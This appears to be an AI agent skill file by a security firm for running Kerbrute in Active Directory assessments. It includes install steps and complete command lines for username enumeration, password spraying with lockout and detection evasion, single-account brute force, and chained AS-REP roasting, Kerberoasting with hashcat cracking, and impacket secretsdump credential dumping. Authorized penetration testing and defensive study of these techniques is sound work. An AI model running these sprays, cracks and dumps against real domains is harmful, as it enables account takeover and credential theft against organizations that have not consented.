---
name: kerbrute
description: >
  Operate Kerbrute — a Kerberos-based Active Directory enumeration and brute force tool that performs
  user enumeration, password spraying, and credential brute force via Kerberos pre-authentication without
  triggering traditional LDAP lockout mechanisms. Use during Active Directory assessments for username
  enumeration, safe password spraying, and credential testing. Covers installation (Go, releases), user
  enumeration, password spraying cadence, brute force, DC targeting, verbose output, output files, and
  integration with BloodHound and NetExec AD attack workflows.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/ropnop/kerbrute
  stars: '3.2k'
  language: Go
---

# kerbrute Agent Skill

## When to Use This Skill

Use this skill when:
- Conducting Active Directory assessments and need to enumerate valid usernames without LDAP access
- Performing password spraying against AD while minimizing lockout risk
- Validating a username list before running BloodHound or other AD enumeration tools
- Bruteforcing Kerberos credentials for a specific high-value account
- The user asks about Kerberos enumeration, AS-REP roasting preparation, or AD username discovery

## What Kerbrute Does

Kerbrute sends Kerberos AS-REQ (Authentication Service Request) messages to a Domain Controller to
test usernames and passwords. For user enumeration, it looks for `KDC_ERR_C_PRINCIPAL_UNKNOWN` (user
does not exist) vs any other response (user exists). For password spraying/brute force, it looks for
`KDC_ERR_PREAUTH_FAILED` (wrong password but valid user) vs `AS-REP` (valid credentials). This
approach does NOT trigger LDAP authentication failures, which means it may not trip traditional
lockout counters — though Kerberos pre-auth failures still generate Windows Event ID 4771.

## Installation

### Method 1 — Download Pre-compiled Release (recommended)

```bash
# Get latest release
VERSION=$(curl -s https://api.github.com/repos/ropnop/kerbrute/releases/latest \
  | grep tag_name | cut -d '"' -f4)

# Linux (64-bit)
wget "https://github.com/ropnop/kerbrute/releases/download/${VERSION}/kerbrute_linux_amd64"
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (64-bit)
# Download: kerbrute_windows_amd64.exe from releases page

# macOS (64-bit)
wget "https://github.com/ropnop/kerbrute/releases/download/${VERSION}/kerbrute_darwin_amd64"
chmod +x kerbrute_darwin_amd64

# Verify
kerbrute --help
```

### Method 2 — Build from Source

```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build -ldflags "-s -w" -o kerbrute .

# Cross-compile for Windows from Linux
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o kerbrute.exe .

# Or use the Makefile
make linux
make windows
make mac
```

## Core Concepts

### Kerberos Pre-Authentication

When a client requests a Kerberos TGT, the DC validates the request. The DC returns:

| Response | Meaning |
|----------|---------|
| `PRINCIPAL UNKNOWN` | Username does not exist in AD |
| `CLIENT_REVOKED` | Account disabled or locked |
| `PREAUTH_FAILED` | Username valid, wrong password |
| `AS-REP` returned | Valid credentials — TGT issued |
| `KDC_ERR_ETYPE_NOSUPP` | Valid user, enc type not supported |

Kerbrute exploits these differential responses to enumerate usernames and validate credentials.

### Event IDs Generated

| Action | Windows Event ID |
|--------|-----------------|
| Valid user, wrong password | 4771 (Kerberos pre-auth failure) |
| Valid credentials (TGT issued) | 4768 (Kerberos TGT request) |
| Non-existent user | 4768 with failure code 0x6 (rare, may not log) |

Unlike LDAP auth failures (4625), 4771 events are less frequently monitored and do NOT trigger
standard AD lockout policies in most environments — though this varies by configuration.

### Lockout Considerations

AD lockout policies are typically LDAP/NTLM based. Kerberos pre-auth failures may not count toward
the `badPwdCount` attribute in older domains. However:
- Fine-Grained Password Policies (FGPP) on newer DCs may track Kerberos failures
- SIEM detection on 4771 volume is common in security-mature organizations
- Always verify lockout threshold before spraying: check via LDAP if possible

```bash
# Check lockout policy (if LDAP access available)
crackmapexec smb DC_IP -u user -p pass --pass-pol
netexec smb DC_IP -u user -p pass --pass-pol
```

## CLI Reference

### User Enumeration

Enumerate valid usernames from a wordlist without triggering LDAP lockouts.

```bash
# Basic user enumeration
kerbrute userenum -d DOMAIN.LOCAL users.txt

# Specify DC explicitly (required if DNS does not resolve domain)
kerbrute userenum -d DOMAIN.LOCAL --dc 192.168.1.10 users.txt

# Verbose output — show response type for each attempt
kerbrute userenum -d DOMAIN.LOCAL --dc 192.168.1.10 -v users.txt

# Save valid users to output file
kerbrute userenum -d DOMAIN.LOCAL --dc 192.168.1.10 users.txt -o valid_users.txt

# Set number of goroutines (threads) for speed (default: 10)
kerbrute userenum -d DOMAIN.LOCAL --dc 192.168.1.10 -t 20 users.txt

# Delay between requests (milliseconds) for stealth
kerbrute userenum -d DOMAIN.LOCAL --dc 192.168.1.10 --delay 500 users.txt
```

### Password Spraying

Test one password against all valid usernames.

```bash
# Basic password spray — one password, all users
kerbrute passwordspray -d DOMAIN.LOCAL --dc 192.168.1.10 users.txt 'Password1'

# Spray against current season pattern
kerbrute passwordspray -d DOMAIN.LOCAL --dc 192.168.1.10 users.txt 'Spring2026!'
kerbrute passwordspray -d DOMAIN.LOCAL --dc 192.168.1.10 users.txt 'April2026'

# Spray with verbose output (show each attempt result)
kerbrute passwordspray -d DOMAIN.LOCAL --dc 192.168.1.10 -v users.txt 'Welcome1'

# Spray and output hits to file
kerbrute passwordspray -d DOMAIN.LOCAL --dc 192.168.1.10 \
  users.txt 'Password123' -o spray_hits.txt

# With delay (milliseconds) between attempts — critical for avoiding lockout
kerbrute passwordspray -d DOMAIN.LOCAL --dc 192.168.1.10 \
  --delay 1000 users.txt 'Welcome1'

# Use a hashcat-style hash as password (PTH-style, not usually supported by Kerberos)
# Note: Kerberos requires plaintext or RC4 hash for AS-REQ — not NTLM directly
```

### Brute Force (Single User)

Test multiple passwords against a single account.

```bash
# Brute force a specific user with a password list
kerbrute bruteuser -d DOMAIN.LOCAL --dc 192.168.1.10 passwords.txt administrator

# Brute force with verbose output
kerbrute bruteuser -d DOMAIN.LOCAL --dc 192.168.1.10 -v passwords.txt jsmith

# Brute force with output
kerbrute bruteuser -d DOMAIN.LOCAL --dc 192.168.1.10 \
  rockyou_top1000.txt administrator -o bruteforce_results.txt
```

### Brute Force (Username:Password pairs)

```bash
# credential pair file format: username:password (one per line)
cat creds.txt
# jsmith:Password1
# administrator:Welcome1

kerbrute bruteforce -d DOMAIN.LOCAL --dc 192.168.1.10 creds.txt
```

### Global Flags

```bash
# All commands support:
-d DOMAIN       # Target domain (FQDN preferred: corp.local)
--dc IP/HOST    # Domain controller IP or hostname
-t N            # Number of goroutines (default 10)
--delay N       # Milliseconds between each request
-v              # Verbose: show all attempts including failures
-o FILE         # Output file for valid accounts found
--safe          # Enable safe mode — abort if lockout threshold detected
--downgrade     # Force RC4 encryption (compatibility with older DCs)
--timeout N     # Timeout in seconds per request (default 5)
```

## Safe Spraying Cadence

Reckless password spraying is the primary cause of account lockouts. Follow this protocol:

```bash
# Step 1 — Determine lockout threshold (via LDAP/SMB if accessible)
netexec smb DC_IP -u '' -p '' --pass-pol 2>/dev/null || true
crackmapexec smb DC_IP --pass-pol 2>/dev/null || true

# Step 2 — Enumerate valid users FIRST (no password, no lockout risk)
kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP users.txt -o valid_users.txt

# Step 3 — Spray at most (threshold - 1) passwords, with time between rounds
# If lockout threshold = 5, spray maximum 4 times before waiting for reset window
# If observation window = 30 min, wait 31 min between spray rounds

# Example safe spray — one password, 1-second delay between users
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC_IP \
  --delay 1000 valid_users.txt 'Spring2026!' -o round1_hits.txt

# Wait lockout observation window (e.g., 30 minutes) before next round
sleep 1800
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC_IP \
  --delay 1000 valid_users.txt 'Password2026!' -o round2_hits.txt
```

## Username Wordlist Sources

```bash
# Generate username permutations from a names list
# Format variants: jsmith, john.smith, smithj, john_smith
pip install username-anarchy
username-anarchy -f first,last -i names.txt > usernames.txt

# Common username list from SecLists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AD-specific: combine common first initial + last name patterns
awk '{print tolower(substr($1,1,1) $2)}' names.csv >> usernames.txt   # jsmith
awk '{print tolower($1) "." tolower($2)}' names.csv >> usernames.txt  # john.smith
```

## Common Workflows

### Workflow 1 — Full AD Enumeration Chain

```bash
# Step 1 — Enumerate users via Kerbrute
kerbrute userenum -d corp.local --dc 192.168.1.10 \
  /usr/share/seclists/Usernames/Names/names.txt \
  -o kerbrute_valid_users.txt -t 20

# Step 2 — Extract just usernames from output
grep "VALID" kerbrute_valid_users.txt | awk '{print $NF}' | \
  sed 's/@.*//' > clean_users.txt

# Step 3 — Safe password spray
kerbrute passwordspray -d corp.local --dc 192.168.1.10 \
  --delay 500 clean_users.txt 'Spring2026!' -o spray_hits.txt

# Step 4 — Validate hits with NetExec
cat spray_hits.txt | grep "VALID" | awk '{print $NF}' | \
  awk -F: '{print $1}' > valid_user_pass_pairs.txt

netexec smb 192.168.1.10 -u valid_user -p 'Spring2026!'

# Step 5 — Run BloodHound collection with valid credentials
bloodhound-python -u 'jsmith' -p 'Spring2026!' \
  -d corp.local -ns 192.168.1.10 --zip -c All
```

### Workflow 2 — AS-REP Roasting Preparation

```bash
# Enumerate users — identify those with "Do not require Kerberos pre-auth" set
# Kerbrute itself doesn't perform AS-REP roasting, but valid user list feeds into:
impacket-GetNPUsers corp.local/ -usersfile valid_users.txt \
  -format hashcat -outputfile asrep_hashes.txt -dc-ip 192.168.1.10

# Crack hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Workflow 3 — Kerberoasting via Kerbrute-Found Creds

```bash
# Once spray yields valid credentials, Kerberoast service accounts
impacket-GetUserSPNs corp.local/jsmith:'Spring2026!' \
  -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt

hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Integration with Other Tools

### With BloodHound

Valid credentials from Kerbrute feed directly into BloodHound collection:
```bash
bloodhound-python -u 'USER' -p 'PASS' -d DOMAIN -ns DC_IP --zip -c All
```

### With NetExec

```bash
# Verify sprayed credentials across all SMB hosts
netexec smb 192.168.1.0/24 -u found_users.txt -p 'Spring2026!'

# Check for local admin
netexec smb 192.168.1.0/24 -u 'jsmith' -p 'Spring2026!' --local-auth
```

### With Impacket

```bash
# AS-REP roasting, Kerberoasting, secretsdump all accept creds from Kerbrute sprays
impacket-secretsdump corp.local/jsmith:'Pass'@DC_IP
```

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| `Couldn't reach KDC` | Wrong DC IP or firewall | Verify `--dc` flag; `nmap -p 88 DC_IP` |
| All users show invalid | Wrong domain name | Use FQDN: `corp.local` not `CORP` |
| Clock skew error | >5 min time difference from DC | `sudo ntpdate DC_IP` or `timedatectl` |
| Slow enumeration | Low thread count | Increase `-t 30`, check network latency |
| `[+] VALID LOGIN` but auth fails | Password policy includes Unicode | Test manually with `kinit` |
| False negatives on enumeration | Kerberos policy blocks enum | Try `--downgrade` for RC4 |
| Account lockout | Lockout policy on Kerberos failures | Use `--delay`, respect observation window |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [5 Active Directory Misconfigurations We See in Every Engagement](https://redhound.us/ad-misconfigurations)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
